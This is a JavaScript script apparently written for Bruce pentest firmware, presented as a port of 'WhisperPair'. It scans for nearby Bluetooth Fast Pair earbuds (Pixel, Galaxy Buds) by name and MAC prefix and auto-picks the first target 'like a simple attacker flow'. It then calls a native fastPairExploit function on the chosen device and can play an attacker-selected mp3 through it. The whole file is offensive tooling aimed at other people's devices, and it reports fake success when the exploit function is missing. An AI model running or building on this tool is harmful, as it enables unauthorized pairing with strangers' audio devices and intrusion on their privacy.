var dialog = require('dialog');
var serial = require('serial');
var display = require('display');
var keyboard = require('keyboard');

var dialogMessage = dialog.info;
var dialogChoice = dialog.choice;
var dialogError = dialog.error;

var serialPrintln = serial.println;
var fillScreen = display.fill;

// DIY_WhisperPair (Bruce port)
// BLE scan + "fast pair" style action + optional file playback (if firmware supports it).
// Use at your own risk.

var CONFIG = {
  SCAN_INTERVAL_MS: 3000,
  MIN_RSSI_DBM: -80,
  MAX_TRACKED_DEVICES: 10,
  NAME_REGEX: /Fast\s*Pair|Pixel|Galaxy Buds/i,
  MAC_PREFIXES: [
    "3C:5A:B4",
    "D4:3B:04"
  ]
};

var BleNative = {
  startScan: function (onDevice) {
    if (typeof BruceBle !== "undefined" && BruceBle.scanStart) {
      BruceBle.scanStart(function (addr, name, rssi) {
        onDevice({
          addr: addr,
          name: name || "",
          rssi: typeof rssi === "number" ? rssi : -127
        });
      });
    } else {
      serialPrintln("BleNative.startScan: BruceBle.scanStart not available");
    }
  },

  stopScan: function () {
    if (typeof BruceBle !== "undefined" && BruceBle.scanStop) {
      BruceBle.scanStop();
    } else {
      serialPrintln("BleNative.stopScan: BruceBle.scanStop not available");
    }
  },

  triggerAction: function (device, done) {
    if (typeof BruceBle !== "undefined" && BruceBle.fastPairExploit) {
      BruceBle.fastPairExploit(device.addr, function (ok) {
        done(!!ok);
      });
    } else {
      serialPrintln("BleNative.triggerAction: BruceBle.fastPairExploit not available, faking success");
      done(true);
    }
  },

  playFileOnDevice: function (device, filePath, done) {
    if (!filePath) {
      done(false);
      return;
    }

    if (typeof BruceBle !== "undefined" && BruceBle.playFileOnDevice) {
      BruceBle.playFileOnDevice(device.addr, filePath, function (ok) {
        done(!!ok);
      });
    } else {
      serialPrintln("BleNative.playFileOnDevice: BruceBle.playFileOnDevice not available");
      done(false);
    }
  }
};

function log(msg) {
  serialPrintln(msg);
}

// State (kept global like wifi_brute.js)
var matched_devices = [];
var scanning = false;
var target_device = null;
var song_to_play_path = "";

function matchesFilters(addr, name, rssi) {
  if (rssi < CONFIG.MIN_RSSI_DBM) return false;
  if (CONFIG.NAME_REGEX && !CONFIG.NAME_REGEX.test(name)) return false;

  if (CONFIG.MAC_PREFIXES && CONFIG.MAC_PREFIXES.length > 0) {
    var upper = addr.toUpperCase();
    var prefixMatch = false;
    for (var i = 0; i < CONFIG.MAC_PREFIXES.length; i++) {
      if (upper.indexOf(CONFIG.MAC_PREFIXES[i]) === 0) {
        prefixMatch = true;
        break;
      }
    }
    if (!prefixMatch) return false;
  }

  return true;
}

function findDeviceIndex(addr) {
  for (var i = 0; i < matched_devices.length; i++) {
    if (matched_devices[i].addr === addr) return i;
  }
  return -1;
}

function upsertDevice(addr, name, rssi) {
  var now = Date.now ? Date.now() : (new Date()).getTime();
  var idx = findDeviceIndex(addr);

  if (idx >= 0) {
    var d = matched_devices[idx];
    d.rssi = rssi;
    d.lastSeen = now;
    if (d.seenCount < 0x7fffffff) d.seenCount++;
    return;
  }

  if (matched_devices.length >= CONFIG.MAX_TRACKED_DEVICES) {
    var weakestIdx = 0;
    var weakestRssi = matched_devices[0].rssi;
    for (var j = 1; j < matched_devices.length; j++) {
      if (matched_devices[j].rssi < weakestRssi) {
        weakestRssi = matched_devices[j].rssi;
        weakestIdx = j;
      }
    }
    matched_devices.splice(weakestIdx, 1);
  }

  matched_devices.push({
    addr: addr,
    name: name,
    rssi: rssi,
    lastSeen: now,
    seenCount: 1
  });
}

function onScanDevice(dev) {
  var addr = dev && dev.addr ? dev.addr : "";
  var name = dev && dev.name ? dev.name : "";
  var rssi = dev && typeof dev.rssi === "number" ? dev.rssi : -127;
  if (!addr) return;

  if (!matchesFilters(addr, name, rssi)) return;

  var wasEmpty = matched_devices.length === 0;
  upsertDevice(addr, name, rssi);

  // "Select first hit" behavior, like a simple attacker flow.
  if (wasEmpty && scanning) {
    target_device = matched_devices[0];
    stopBleScan();
  }
}

function startBleScan() {
  if (scanning) return;
  scanning = true;
  matched_devices = [];
  target_device = null;
  BleNative.startScan(onScanDevice);
}

function stopBleScan() {
  scanning = false;
  BleNative.stopScan();
}

function scanAndPickFirstTarget() {
  startBleScan();
  while (true) {
    if (matched_devices.length > 0) break;
    if (keyboard && keyboard.getEscPress && keyboard.getEscPress()) break;
    if (!scanning) break;
    delay(100); // yield
  }
  stopBleScan();
}

function showMatchedDevices() {
  fillScreen(0);
  log("=== Matched Devices (" + matched_devices.length + ") ===");

  if (target_device) {
    log("TARGET: " + target_device.name + " [" + target_device.addr + "], " + target_device.rssi + " dBm");
  }

  if (matched_devices.length === 0) {
    dialogError("no matching devices, start scan first");
    return;
  }

  for (var i = 0; i < matched_devices.length; i++) {
    var d = matched_devices[i];
    log((i + 1) + ") " + d.name + " [" + d.addr + "], " + d.rssi + " dBm, seen " + d.seenCount + "x");
  }
}

function triggerActionOnDeviceByIndex(n) {
  if (matched_devices.length === 0) {
    dialogError("no devices to act on");
    return;
  }
  if (!(n > 0 && n <= matched_devices.length)) {
    dialogError("invalid device index: " + n);
    return;
  }

  var dev = matched_devices[n - 1];
  target_device = dev;
  log("Triggering action for: " + dev.name + " [" + dev.addr + "]");

  BleNative.triggerAction(dev, function (ok) {
    if (ok) dialogMessage("action OK for " + dev.addr, true);
    else dialogError("action FAILED for " + dev.addr, true);
  });
}

function pickSongFile() {
  var p = dialog.pickFile("/");
  if (!p) return;
  song_to_play_path = p;
}

function playSongOnTarget() {
  if (!target_device) {
    dialogError("no target device, start scan first");
    return;
  }
  if (!song_to_play_path) {
    dialogError("no song selected");
    return;
  }

  var lower = ("" + song_to_play_path).toLowerCase();
  if (lower.lastIndexOf(".mp3") !== lower.length - 4) {
    dialogError("please select an .mp3 file");
    return;
  }

  log("Playing mp3 on target: " + target_device.name + " [" + target_device.addr + "]");
  dialogMessage("Playing on " + target_device.addr);

  BleNative.playFileOnDevice(target_device, song_to_play_path, function (ok) {
    if (ok) dialogMessage("playback OK for " + target_device.addr, true);
    else dialogError("playback FAILED for " + target_device.addr, true);
  });
}

while (true) {
  var choice = dialogChoice({
    ["Select target (scan)"]: "scan",
    ["Show matched devices"]: "show",
    ["Trigger action"]: "attack",
    ["Pick song (.mp3)"]: "pick",
    ["Play song on target"]: "play"
  });

  if (choice == "") break; // quit

  if (choice == "scan") {
    dialogMessage("Scanning BLE.. (ESC to stop)");
    scanAndPickFirstTarget();
    if (matched_devices.length > 0 && target_device) {
      dialogMessage("target: " + target_device.addr, true);
    } else {
      dialogMessage("scan stopped, no device", true);
    }
  } else if (choice == "show") {
    showMatchedDevices();
  } else if (choice == "attack") {
    if (matched_devices.length === 0) {
      dialogError("no devices yet, scan first");
    } else {
      var idxStr = dialogChoice({
        ["Device #1"]: "1",
        ["Device #2"]: "2",
        ["Device #3"]: "3",
        ["Device #4"]: "4",
        ["Device #5"]: "5"
      });
      if (idxStr) triggerActionOnDeviceByIndex(parseInt(idxStr, 10));
    }
  } else if (choice == "pick") {
    pickSongFile();
  } else if (choice == "play") {
    playSongOnTarget();
  }

  fillScreen(0);
  delay(10);
}

